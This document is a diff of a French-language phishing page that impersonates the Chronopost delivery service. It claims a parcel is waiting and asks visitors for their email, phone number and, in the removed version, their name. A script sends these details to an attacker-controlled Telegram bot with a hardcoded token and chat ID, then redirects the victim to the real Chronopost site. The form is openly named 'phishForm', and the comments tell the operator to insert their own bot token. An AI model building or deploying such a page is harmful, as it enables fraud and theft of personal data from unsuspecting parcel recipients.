@@ -3,136 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification Chronopost</title>
+    <title>Vérification Colis - Chronopost</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f2f2f7;
+            font-family: 'Arial', sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
         }
-        .card {
-            background: white;
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        .container {
+            background-color: #ffffff;
             width: 90%;
-            max-width: 380px;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
             text-align: center;
         }
-        h2 { margin-top: 0; color: #1c1c1e; font-size: 1.4em; }
-        p { color: #6e6e73; font-size: 0.95em; line-height: 1.4; }
+        .logo {
+            color: #003366; /* Bleu Chronopost */
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #ff6600; /* Ligne Orange */
+            padding-bottom: 10px;
+            display: inline-block;
+        }
+        .icon {
+            font-size: 40px;
+            color: #ff6600;
+            margin-bottom: 15px;
+        }
+        h2 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
         input {
-            width: 100%; padding: 15px; margin: 10px 0;
-            border: 1px solid #c7c7cc; border-radius: 10px;
-            box-sizing: border-box; font-size: 16px;
-            background: #f9f9f9;
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
         }
-        input:focus { outline: none; border-color: #007aff; background: white; }
         button {
-            width: 100%; padding: 16px; background-color: #007aff;
-            color: white; border: none; border-radius: 10px;
-            font-size: 17px; font-weight: 600; cursor: pointer;
-            margin-top: 15px;
-            transition: opacity 0.2s;
+            background-color: #ff6600; /* Orange Chronopost */
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 95%;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
         }
-        button:active { opacity: 0.8; }
+        button:hover {
+            background-color: #e65c00;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
         .loader {
-            display: none; border: 3px solid #f3f3f3;
-            border-top: 3px solid #007aff; border-radius: 50%;
-            width: 24px; height: 24px; animation: spin 1s linear infinite;
-            margin: 15px auto;
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff6600;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 15px; font-size: 14px; font-weight: 500; }
-        .success { color: #34c759; }
-        .error { color: #ff3b30; font-size: 12px; text-align: left; padding: 10px; background: #ffe5e5; border-radius: 8px; display: none;}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>📦 Chronopost - Livraison</h2>
-        <p>Votre colis <strong>#FR-2026-892</strong> est en attente de validation. Veuillez confirmer votre identité pour éviter la réexpédition.</p>
-        
-        <form id="dataForm">
-            <input type="text" id="nom" placeholder="Nom et Prénom" required autocomplete="name">
-            <input type="email" id="email" placeholder="Adresse Email" required autocomplete="email">
-            <input type="tel" id="tel" placeholder="Numéro de portable" required autocomplete="tel">
-            <button type="submit" id="btn">Confirmer l'identité</button>
-            <div class="loader" id="loader"></div>
-            <p id="status" class="success" style="display:none;">✅ Données envoyées. Redirection...</p>
-            <div id="debug" class="error"></div>
-        </form>
-    </div>
+<div class="container">
+    <div class="logo">Chronopost</div>
+    
+    <div class="icon">📦</div>
+    
+    <h2>Colis en attente de livraison</h2>
+    <p>Veuillez confirmer vos coordonnées pour permettre au livreur de vous contacter.</p>
 
-    <script>
-        // ==========================================
-        // CONFIGURATION DÉJÀ REMPLIE
-        // ==========================================
-        const TOKEN = "8835375365:AAGXLVfFbU_wNtDvs5jxpEeQ19V2n61Y_WwQ"; 
-        const CHAT_ID = "8501464548"; 
-        // ==========================================
+    <form id="phishForm">
+        <input type="email" id="email" placeholder="Votre adresse email" required>
+        <input type="tel" id="phone" placeholder="Votre numéro de téléphone" required>
+        <button type="submit">Valider et recevoir le colis</button>
+    </form>
 
-        document.getElementById('dataForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const nom = document.getElementById('nom').value;
-            const email = document.getElementById('email').value;
-            const tel = document.getElementById('tel').value;
-            const btn = document.getElementById('btn');
-            const loader = document.getElementById('loader');
-            const status = document.getElementById('status');
-            const debug = document.getElementById('debug');
+    <div class="loader" id="loader"></div>
+</div>
 
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            debug.style.display = 'none';
+<script>
+    // ⚠️ CONFIGURATION : Remplace par TON BOT TOKEN et TON CHAT ID
+    const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ"; // Mets ton vrai token ici
+    const CHAT_ID = "8501464548";
 
-            const message = 
-`🔔 <b>Nouvelle Identification</b>
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-👤 <b>Nom:</b> ${nom}
-📧 <b>Email:</b> ${email}
-📱 <b>Tel:</b> ${tel}
+        // Afficher le loader
+        document.querySelector('button').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}
-🌍 <b>Appareil:</b> ${/iPhone|iPad/i.test(navigator.userAgent) ? "iOS" : "Autre"}`;
+        const email = document.getElementById('email').value;
+        const phone = document.getElementById('phone').value;
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
+        // Envoyer les données à ton Bot Telegram
+        const message = `📦 *Nouveau Colis Chronopost*\n\n📧 Email: ${email}\n📞 Téléphone: ${phone}\n\n🕒 ${new Date().toLocaleString()}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
             })
-            .then(res => {
-                if(!res.ok) throw new Error(`Erreur API: ${res.status}`);
-                return res.json();
-            })
-            .then(data => {
-                if(data.ok) {
-                    status.style.display = 'block';
-                    setTimeout(() => {
-                        window.location.href = "https://www.chronopost.fr";
-                    }, 1500);
-                } else {
-                    throw new Error(data.description || "Erreur inconnue");
-                }
-            })
-            .catch(err => {
-                debug.textContent = "DÉTAIL: " + err.message;
-                debug.style.display = 'block';
-                loader.style.display = 'none';
-                btn.style.display = 'block';
-            });
+        })
+        .then(response => {
+            // Succès : Rediriger vers la vraie page Chronopost
+            window.location.href = "https://www.chronopost.fr/";
+        })
+        .catch(error => {
+            alert("Erreur de connexion. Veuillez réessayer.");
+            document.getElementById('loader').style.display = 'none';
+            document.querySelector('button').style.display = 'block';
         });
-    </script>
+    });
+</script>
 
 </body>
 </html>
